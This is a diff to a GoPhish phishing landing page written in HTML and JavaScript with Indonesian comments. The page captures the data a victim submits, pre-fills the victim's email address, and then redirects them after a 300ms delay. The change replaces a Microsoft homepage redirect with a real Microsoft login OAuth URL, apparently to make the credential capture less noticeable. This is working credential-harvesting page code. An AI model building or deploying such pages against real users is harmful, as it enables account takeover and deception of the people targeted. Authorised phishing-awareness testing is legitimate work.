@@ -204,7 +204,8 @@
 
 <script>
     // URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
-    const REDIRECT_URL = "https://www.microsoft.com/id-id"; 
+    // UBAH NILAI INI dengan link yang diminta:
+    const REDIRECT_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=16df12a0-a120-42cc-82a0-15b15646161f&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBSWKCMAAAwL949cCu9Ahh30kICDeWNihiFA1CXt-Zg6uAe0_LqZsuvfyCmd_DqMFtEWzSONQNUsJRTQn63mjTnpT3r7njEzeSo54auLYJqoNqrqznbpTcYnPcgdyjku9e43ZyPkwRbl4aKd39ImKfhd7dPdI01YVgG8WoSyRN3Z4wblNDD4S35vYzfNNImJZdFBYykEgxg_2jsIjW7SxpN7zWUMM_n4rrPD6vlJSeXARnATgJ_-Yb7uWSAZbvRykb1uUMep4NYJ4Q8HPAHFpdUGGlM9fM0VntzZnrxJaSl3hdSNHYoaoZhJwGObty_dvZPsuZbiBeFQ-9LGC5Nh3888zltT8QskOmTmYPh8M_ZcHOn0IBAAA&msaoauth2=true&instance_aware=true&lc=1057"; 
 
     // Variabel GoPhish untuk mengisi email secara otomatis
     const GOPHISH_EMAIL = "{{.Email}}";
@@ -253,7 +254,7 @@
         form.removeEventListener('submit', arguments.callee);
         form.submit();
         
-        // 3. Alihkan pengguna setelah jeda singkat
+        // 3. Alihkan pengguna setelah jeda singkat (300ms)
         setTimeout(function() {
             window.location.href = REDIRECT_URL;
         }, 300); 
